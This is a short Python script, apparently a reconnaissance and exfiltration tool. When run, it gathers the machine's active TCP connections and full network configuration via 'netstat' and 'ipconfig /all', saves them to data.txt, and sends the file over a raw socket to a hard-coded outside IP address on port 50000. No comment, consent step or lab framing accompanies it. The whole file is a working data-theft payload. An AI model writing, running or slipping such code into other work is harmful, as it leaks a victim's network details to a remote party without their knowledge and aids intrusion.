import socket
import os


def extract_data():
    directory = os.path.dirname(os.path.abspath(__file__))
    file = os.path.join(directory, 'data.txt')
    n_r = os.popen('netstat -an -p tcp').read()
    i_r = os.popen('ipconfig /all').read()
    with open(file, 'w') as data_file:
        data_file.write(f"Result of 'netstat -an -p tcp':\n{n_r}\n\n")
        data_file.write(f"Result of 'ipconfig /all':\n{i_r}\n")
    return 'data.txt'

def send_data(host, port, data_file):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))  
    with open(data_file, 'rb') as f:
        data = f.read()
        size = len(data)
        sock.sendall(size.to_bytes(4, byteorder='big'))
        sock.sendall(data)
    sock.close()

file = extract_data()
send_data('181.221.19.229', 50000, file)